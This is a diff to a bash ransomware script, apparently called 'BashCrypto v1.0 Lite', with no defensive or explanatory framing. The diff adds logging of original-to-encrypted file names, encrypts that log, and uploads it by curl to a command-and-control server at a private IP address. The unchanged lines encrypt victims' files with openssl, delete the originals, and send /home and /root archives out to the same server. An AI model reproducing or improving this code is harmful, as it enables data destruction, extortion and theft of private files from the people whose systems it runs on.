@@ -145,6 +145,8 @@ do
     setFileName=$(genFileName)
     setExtName=$(genExtName)
     getDirName="$(dirname ${file})"
+
+    echo "${file},${getDirName}/${setFileName}.${setExtName}" >> /root/..file_mapping.db
    
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${getDirName}/${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null
 
@@ -162,6 +164,8 @@ do
     setExtName=$(genExtName)
     getDirName="$(dirname ${file})"
 
+    echo "${file},${getDirName}/${setFileName}.${setExtName}" >> /root/..file_mapping.db
+
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${getDirName}/${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null
 
     rm -rf ${file} &>/dev/null
@@ -169,6 +173,9 @@ do
     count=$((count + 1))
   done
 done
+
+openssl enc -aes-256-cbc -salt -in "/root/..file_mapping.db" -out "/root/..file_mapping.db.owned" -pass file:/root/key.bin &>/dev/null
+rm -rf /root/..file_mapping.db
 
 curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.php
 
@@ -208,6 +215,7 @@ openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root
 rm -rf /root/key.bin
 
 # Exfil files to our C2
+tar czf - /root/..file_mapping.db.owned |  curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=file_mapping.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
 tar czf - /root/key.bin.enc | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=enc_key.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
 tar czf - /home/ | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=home.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
 tar czf - /root/ | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=root.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
